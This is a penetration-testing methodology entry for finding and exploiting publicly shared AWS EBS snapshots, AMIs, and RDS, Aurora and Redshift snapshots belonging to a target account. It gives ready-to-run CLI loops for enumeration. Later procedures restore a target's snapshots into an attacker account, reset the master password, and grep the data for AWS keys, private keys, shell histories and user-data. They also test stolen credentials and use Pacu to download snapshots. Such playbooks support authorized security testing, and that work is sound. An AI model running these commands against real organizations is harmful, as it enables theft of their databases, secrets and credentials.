Repeatability: per_account
Prerequisites: Unauthenticated — requires only the target AWS account ID for enumeration; an attacker-controlled AWS account is needed to mount, restore, or launch discovered public snapshots/images
Description: Public Snapshot & Image Data Exposure — AWS allows resources such as EBS snapshots, AMIs, RDS/Aurora snapshots, and Redshift snapshots to be shared publicly. When an organization inadvertently marks these resources as public, any AWS account holder can discover, copy, mount, or restore them. This frequently leads to exposure of sensitive data including database contents, application credentials, encryption keys, configuration files, and proprietary source code. Because these resources are often full disk or database copies, the blast radius of a single misconfigured sharing permission can be catastrophic.
Tags: ebs-snapshot, ami, rds-snapshot, redshift-snapshot, data-exposure, public-access, unauthenticated, snapshot-enumeration
Potential Severity: critical

------------------------------------------
Procedure 0 — Search for Public EBS Snapshots Belonging to Target Account
Tools: aws cli, Prowler, ScoutSuite
Intrusiveness: passive
Description: EBS snapshots can be marked as public, making them accessible to any AWS account. Attackers can enumerate all public snapshots owned by a specific account ID. Public EBS snapshots may contain full filesystem images with credentials, application data, SSH keys, and other sensitive information.

Step 1: Obtain the target AWS account ID (12-digit number). This may come from OSINT, error messages, S3 bucket policies, or other reconnaissance.

Step 2: Enumerate public EBS snapshots owned by the target account across all major regions. Iterate through each region:
```
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-west-2 eu-west-3 eu-central-1 ap-southeast-1 ap-southeast-2 ap-northeast-1 ap-northeast-2 ap-south-1 sa-east-1 ca-central-1; do
  echo "=== Region: $region ==="
  aws ec2 describe-snapshots \
    --owner-ids <TARGET_ACCOUNT_ID> \
    --restorable-by-user-ids all \
    --region "$region" \
    --query 'Snapshots[*].{SnapshotId:SnapshotId,VolumeSize:VolumeSize,StartTime:StartTime,Description:Description,Encrypted:Encrypted}' \
    --output table
done
```

Step 3: For each discovered snapshot, gather detailed metadata:
```
aws ec2 describe-snapshots \
  --snapshot-ids <SNAPSHOT_ID> \
  --region <REGION> \
  --output json
```

Step 4: Note the VolumeSize, Description, and whether the snapshot is encrypted. Unencrypted snapshots can be directly mounted; encrypted snapshots with a public or shared KMS key may also be exploitable.

Step 5: Cross-validate with Prowler (if target credentials are available for verification):
```
prowler aws --check ec2_ebs_public_snapshot -r <REGION>
```

Flag: Any EBS snapshot owned by the target account that is publicly restorable (restorable-by-user-ids includes "all") is a finding.

------------------------------------------
Procedure 1 — Search for Public AMIs Owned by Target Account
Tools: aws cli, Prowler, ScoutSuite
Intrusiveness: passive
Description: Amazon Machine Images (AMIs) can be made public, allowing anyone to launch EC2 instances from them. Public AMIs may contain embedded credentials, proprietary software, internal configurations, SSH keys, database connection strings, and other sensitive data baked into the image.

Step 1: Enumerate all public AMIs owned by the target account across regions:
```
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-west-2 eu-west-3 eu-central-1 ap-southeast-1 ap-southeast-2 ap-northeast-1 ap-northeast-2 ap-south-1 sa-east-1 ca-central-1; do
  echo "=== Region: $region ==="
  aws ec2 describe-images \
    --owners <TARGET_ACCOUNT_ID> \
    --filters "Name=is-public,Values=true" \
    --region "$region" \
    --query 'Images[*].{ImageId:ImageId,Name:Name,Description:Description,CreationDate:CreationDate,Platform:Platform,Architecture:Architecture,RootDeviceType:RootDeviceType,BlockDeviceMappings:BlockDeviceMappings}' \
    --output table
done
```

Step 2: For each discovered AMI, retrieve the full details including block device mappings to identify associated EBS snapshots:
```
aws ec2 describe-images \
  --image-ids <AMI_ID> \
  --region <REGION> \
  --output json
```

Step 3: Extract snapshot IDs from the BlockDeviceMappings — each AMI's EBS-backed volume is tied to a snapshot that can also be independently mounted:
```
aws ec2 describe-images \
  --image-ids <AMI_ID> \
  --region <REGION> \
  --query 'Images[0].BlockDeviceMappings[*].Ebs.SnapshotId' \
  --output text
```

Step 4: Check whether the AMI uses EBS or instance-store root device. EBS-backed AMIs have directly mountable snapshots; instance-store AMIs require launching an instance.

Step 5: Cross-validate with Prowler:
```
prowler aws --check ec2_ami_public -r <REGION>
```

Flag: Any AMI owned by the target account with is-public set to true is a finding.

------------------------------------------
Procedure 2 — Search for Public RDS / Aurora Snapshots
Tools: aws cli, Prowler, ScoutSuite
Intrusiveness: passive
Description: RDS and Aurora database snapshots can be shared publicly. Public database snapshots may contain complete database contents including user tables, credentials, PII, financial records, and application data. This is often one of the most severe findings due to the direct exposure of structured sensitive data.

Step 1: Enumerate public RDS snapshots owned by the target account. Note that RDS public snapshot enumeration requires using the include-public filter:
```
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-west-2 eu-west-3 eu-central-1 ap-southeast-1 ap-southeast-2 ap-northeast-1 ap-northeast-2 ap-south-1 sa-east-1 ca-central-1; do
  echo "=== Region: $region ==="
  aws rds describe-db-snapshots \
    --snapshot-type public \
    --region "$region" \
    --query "DBSnapshots[?DBSnapshotIdentifier!='' && contains(DBSnapshotArn, '<TARGET_ACCOUNT_ID>')].{DBSnapshotIdentifier:DBSnapshotIdentifier,DBInstanceIdentifier:DBInstanceIdentifier,Engine:Engine,SnapshotCreateTime:SnapshotCreateTime,AllocatedStorage:AllocatedStorage,Status:Status,DBSnapshotArn:DBSnapshotArn}" \
    --output table
done
```

Step 2: Alternatively, if the list of all public snapshots is too large, filter specifically by the target account ARN pattern:
```
aws rds describe-db-snapshots \
  --snapshot-type public \
  --region <REGION> \
  --query "DBSnapshots[?contains(DBSnapshotArn, '<TARGET_ACCOUNT_ID>')]" \
  --output json
```

Step 3: Enumerate public Aurora cluster snapshots:
```
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-west-2 eu-west-3 eu-central-1 ap-southeast-1 ap-southeast-2 ap-northeast-1 ap-northeast-2 ap-south-1 sa-east-1 ca-central-1; do
  echo "=== Region: $region ==="
  aws rds describe-db-cluster-snapshots \
    --snapshot-type public \
    --region "$region" \
    --query "DBClusterSnapshots[?contains(DBClusterSnapshotArn, '<TARGET_ACCOUNT_ID>')].{DBClusterSnapshotIdentifier:DBClusterSnapshotIdentifier,DBClusterIdentifier:DBClusterIdentifier,Engine:Engine,SnapshotCreateTime:SnapshotCreateTime,AllocatedStorage:AllocatedStorage,Status:Status}" \
    --output table
done
```

Step 4: For each discovered snapshot, record the engine type (mysql, postgres, aurora-mysql, aurora-postgresql, etc.) as this determines the restoration method and tooling needed.

Step 5: Cross-validate with Prowler:
```
prowler aws --check rds_snapshots_public_access -r <REGION>
```

Flag: Any RDS or Aurora snapshot owned by the target account that appears in the public snapshot listing is a finding.

------------------------------------------
Procedure 3 — Search for Public Redshift Snapshots
Tools: aws cli, Prowler
Intrusiveness: passive
Description: Amazon Redshift cluster snapshots can be shared publicly. These snapshots contain entire data warehouse contents which may include aggregated business data, analytics datasets, customer records, and other high-value structured data.

Step 1: Enumerate public Redshift snapshots accessible in each region:
```
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-west-2 eu-west-3 eu-central-1 ap-southeast-1 ap-southeast-2 ap-northeast-1 ap-northeast-2 ap-south-1 sa-east-1 ca-central-1; do
  echo "=== Region: $region ==="
  aws redshift describe-cluster-snapshots \
    --snapshot-type manual \
    --region "$region" \
    --query "Snapshots[?AccountsWithRestoreAccess[?AccountId=='all'] && OwnerAccount=='<TARGET_ACCOUNT_ID>'].{SnapshotIdentifier:SnapshotIdentifier,ClusterIdentifier:ClusterIdentifier,SnapshotCreateTime:SnapshotCreateTime,TotalBackupSizeInMegaBytes:TotalBackupSizeInMegaBytes,OwnerAccount:OwnerAccount}" \
    --output table
done
```

Step 2: Alternatively, retrieve all snapshots and filter for the target account:
```
aws redshift describe-cluster-snapshots \
  --snapshot-type manual \
  --owner-account <TARGET_ACCOUNT_ID> \
  --region <REGION> \
  --output json
```

Step 3: Check the AccountsWithRestoreAccess field to confirm public sharing:
```
aws redshift describe-cluster-snapshots \
  --snapshot-identifier <SNAPSHOT_ID> \
  --region <REGION> \
  --query "Snapshots[0].AccountsWithRestoreAccess" \
  --output json
```

Step 4: Cross-validate with Prowler:
```
prowler aws --check redshift_cluster_public_access -r <REGION>
```

Flag: Any Redshift snapshot owned by the target account that has AccountsWithRestoreAccess containing "all" (public) is a finding.

------------------------------------------
Procedure 4 — Attempt to Mount / Launch Discovered Public Snapshots in Attacker Account
Tools: aws cli, Pacu
Intrusiveness: medium
Description: [DOCUMENT ONLY] Once public snapshots or images are discovered, an attacker can copy, mount, launch, or restore them in their own AWS account to access the underlying data. This procedure documents the exact steps to validate data accessibility. In an authorized engagement, perform these steps only with explicit written permission.

Step 1: Mount a discovered public EBS snapshot — create a volume from it in the attacker account (must be in the same region as the snapshot):
```
aws ec2 create-volume \
  --snapshot-id <SNAPSHOT_ID> \
  --availability-zone <REGION>a \
  --volume-type gp3 \
  --region <REGION> \
  --tag-specifications 'ResourceType=volume,Tags=[{Key=Purpose,Value=SecurityAudit}]'
```

Step 2: Launch an EC2 instance and attach the volume for examination:
```
aws ec2 run-instances \
  --image-id ami-xxxxxxxxxxxxxxxxx \
  --instance-type t3.micro \
  --key-name <YOUR_KEY_PAIR> \
  --region <REGION> \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Purpose,Value=SecurityAudit}]'
```
```
aws ec2 attach-volume \
  --volume-id <VOLUME_ID> \
  --instance-id <INSTANCE_ID> \
  --device /dev/xvdf \
  --region <REGION>
```

Step 3: SSH into the instance and mount the attached volume:
```
ssh -i <KEY>.pem ec2-user@<INSTANCE_IP>
sudo mkdir /mnt/snapshot
sudo mount /dev/xvdf1 /mnt/snapshot
# If partition table is unknown:
sudo fdisk -l /dev/xvdf
# Then mount the appropriate partition
```

Step 4: Launch an instance from a discovered public AMI:
```
aws ec2 run-instances \
  --image-id <PUBLIC_AMI_ID> \
  --instance-type t3.micro \
  --key-name <YOUR_KEY_PAIR> \
  --region <REGION> \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Purpose,Value=SecurityAudit}]'
```

Step 5: Restore a discovered public RDS snapshot into the attacker account:
```
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier audit-restored-db \
  --db-snapshot-identifier arn:aws:rds:<REGION>:<TARGET_ACCOUNT_ID>:snapshot:<SNAPSHOT_NAME> \
  --db-instance-class db.t3.micro \
  --region <REGION> \
  --no-multi-az \
  --publicly-accessible
```

Step 6: Restore a discovered public Aurora cluster snapshot:
```
aws rds restore-db-cluster-from-snapshot \
  --db-cluster-identifier audit-restored-cluster \
  --snapshot-identifier arn:aws:rds:<REGION>:<TARGET_ACCOUNT_ID>:cluster-snapshot:<SNAPSHOT_NAME> \
  --engine aurora-mysql \
  --region <REGION>
```

Step 7: Restore a discovered public Redshift snapshot:
```
aws redshift restore-from-cluster-snapshot \
  --cluster-identifier audit-restored-cluster \
  --snapshot-identifier <SNAPSHOT_ID> \
  --snapshot-cluster-identifier <ORIGINAL_CLUSTER_ID> \
  --region <REGION> \
  --node-type dc2.large \
  --number-of-nodes 1
```

Step 8: After restoration, reset the master password on restored RDS/Redshift instances to gain access:
```
aws rds modify-db-instance \
  --db-instance-identifier audit-restored-db \
  --master-user-password <NEW_PASSWORD> \
  --apply-immediately
```
```
aws redshift modify-cluster \
  --cluster-identifier audit-restored-cluster \
  --master-user-password <NEW_PASSWORD>
```

Step 9: Using Pacu for automated snapshot exfiltration:
```
pacu
> run ebs__download_snapshots --snapshot-ids <SNAPSHOT_ID>
> run ebs__enum_snapshots_unauth --account-ids <TARGET_ACCOUNT_ID>
```

Step 10: Clean up all resources created in the attacker account after examination:
```
aws ec2 terminate-instances --instance-ids <INSTANCE_ID> --region <REGION>
aws ec2 delete-volume --volume-id <VOLUME_ID> --region <REGION>
aws rds delete-db-instance --db-instance-identifier audit-restored-db --skip-final-snapshot --region <REGION>
aws redshift delete-cluster --cluster-identifier audit-restored-cluster --skip-final-cluster-snapshot --region <REGION>
```

Flag: Successfully creating a volume from, launching an instance from, or restoring a database from a target's public snapshot/image confirms exploitable data exposure.

------------------------------------------
Procedure 5 — Identify Sensitive Data Within Mounted Snapshots
Tools: aws cli, trufflehog, gitleaks, grep, find, strings
Intrusiveness: low
Description: [DOCUMENT ONLY] After mounting or restoring public snapshots, the attacker searches for sensitive data such as credentials, API keys, database contents, configuration files, certificates, and proprietary source code. This procedure documents systematic data triage techniques.

Step 1: For mounted EBS volumes, perform a high-level filesystem survey:
```
ls -la /mnt/snapshot/
du -sh /mnt/snapshot/*
find /mnt/snapshot -name "*.env" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" -o -name "*.xml" -o -name "*.properties" 2>/dev/null
```

Step 2: Search for credentials and secrets using trufflehog:
```
trufflehog filesystem /mnt/snapshot --json --no-update 2>/dev/null | tee /tmp/trufflehog_results.json
```

Step 3: Search for secrets using gitleaks on any discovered git repositories:
```
find /mnt/snapshot -name ".git" -type d 2>/dev/null | while read gitdir; do
  repo_dir=$(dirname "$gitdir")
  echo "=== Scanning: $repo_dir ==="
  gitleaks detect --source="$repo_dir" --report-format json --report-path "/tmp/gitleaks_$(basename $repo_dir).json"
done
```

Step 4: Search for SSH keys, AWS credentials, and common secrets:
```
find /mnt/snapshot -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" -o -name "credentials" -o -name ".aws" -o -name ".ssh" 2>/dev/null
grep -rl "AKIA[0-9A-Z]\{16\}" /mnt/snapshot/ 2>/dev/null
grep -rl "aws_secret_access_key" /mnt/snapshot/ 2>/dev/null
grep -rl "BEGIN RSA PRIVATE KEY\|BEGIN OPENSSH PRIVATE KEY\|BEGIN EC PRIVATE KEY" /mnt/snapshot/ 2>/dev/null
```

Step 5: Search for database files and credentials within configuration:
```
find /mnt/snapshot -name "*.sql" -o -name "*.sqlite" -o -name "*.db" -o -name "*.mdb" -o -name "*.dump" 2>/dev/null
grep -rl "password\|passwd\|secret\|api_key\|apikey\|token\|connection_string\|jdbc:" /mnt/snapshot/etc/ /mnt/snapshot/opt/ /mnt/snapshot/var/ /mnt/snapshot/home/ 2>/dev/null
```

Step 6: Check for bash history, environment variables, and user data:
```
find /mnt/snapshot -name ".bash_history" -o -name ".zsh_history" -o -name ".python_history" 2>/dev/null -exec cat {} \;
cat /mnt/snapshot/var/log/cloud-init-output.log 2>/dev/null
cat /mnt/snapshot/var/lib/cloud/instance/user-data.txt 2>/dev/null
find /mnt/snapshot/home -name ".env" -exec cat {} \; 2>/dev/null
```

Step 7: For restored RDS/Aurora databases, connect and enumerate:
```
# MySQL / Aurora MySQL
mysql -h <RESTORED_ENDPOINT> -u admin -p<NEW_PASSWORD> -e "SHOW DATABASES; SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');"

# PostgreSQL / Aurora PostgreSQL
psql -h <RESTORED_ENDPOINT> -U postgres -c "\l" -c "\dt *.*"
```

Step 8: For restored Redshift clusters, connect and enumerate:
```
psql -h <RESTORED_ENDPOINT> -U awsuser -d dev -p 5439 -c "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');"
```

Step 9: Extract and document samples of sensitive data found (redact actual values in reports):
```
# Document findings with file paths, data types, and sensitivity levels
# Screenshot or export evidence of exposed data
# Redact actual credential values in all reports — note presence, not content
```

Step 10: Validate discovered AWS credentials (if found) to assess further impact:
```
# Use discovered credentials to check their validity and scope
aws sts get-caller-identity --profile discovered_creds
aws iam list-attached-user-policies --user-name <USER> --profile discovered_creds
```

Flag: Discovery of any sensitive data (credentials, API keys, PII, database records, private keys, proprietary source code, or configuration secrets) within mounted or restored public snapshots is a finding.

------------------------------------------
References:
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/sharing-amis.html
- https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html
- https://docs.aws.amazon.com/redshift/latest/mgmt/managing-snapshots-console.html#snapshot-share
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ebs-snapshot-dump
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ami-enum
- https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/
- https://rhinosecuritylabs.com/aws/aws-rds-snapshots-public-attack/
- https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#ebs__download_snapshots
- https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#ebs__enum_snapshots_unauth
- https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshots.html
- https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-images.html
- https://docs.aws.amazon.com/cli/latest/reference/rds/describe-db-snapshots.html
- https://docs.aws.amazon.com/cli/latest/reference/rds/describe-db-cluster-snapshots.html
- https://docs.aws.amazon.com/cli/latest/reference/redshift/describe-cluster-snapshots.html
- https://github.com/prowler-cloud/prowler
